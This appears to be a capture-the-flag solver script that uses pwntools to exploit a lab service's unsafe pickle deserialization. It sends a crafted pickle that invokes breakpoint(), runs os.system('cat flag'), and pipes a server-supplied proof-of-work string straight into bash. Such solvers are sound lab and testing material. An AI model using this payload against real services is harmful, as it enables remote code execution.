#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import binascii
import pwnlib.tubes
from pwn import log


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


r = pwnlib.tubes.remote.remote('challenge', 1337)
tmp_data = r.recv(len('proof'), timeout=2)
if tmp_data == b'proof':
    handle_pow(r)
else:
    r.unrecv(tmp_data)

payload = b'('  # MARK
payload += b'i__builtin__\nbreakpoint\n'  # INST
p = binascii.hexlify(payload).decode('utf-8')

r.recvuntil(b': ')
r.sendline(p.encode())
r.sendline(b'import os; os.system("cat flag")')

# breakpoint stuff
[r.recvline() for _ in range(3)]

result = r.recvline()
print('flag:', result)
if b'cr3{' not in result:
    exit(1)

exit(0)
